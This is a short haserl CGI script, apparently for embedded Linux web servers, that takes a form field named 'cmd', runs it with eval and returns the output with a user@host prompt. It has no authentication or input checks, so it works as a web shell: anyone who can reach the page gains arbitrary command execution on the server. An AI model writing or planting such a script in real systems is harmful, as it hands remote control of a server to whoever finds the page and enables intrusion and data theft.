#!/usr/bin/haserl
content-type: text/plain

<%
cd /tmp
cmd="$FORM_cmd"
export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin

echo "<b>[$(whoami)@$(hostname) $PWD]# $cmd</b>"
echo ""

if [ -n "$cmd" -a "$cmd" != "undefined" ]; then
  result=$(eval $cmd 2>&1)
fi

[ -z "$result" ] && echo "- empty -" || echo "$result"
%>
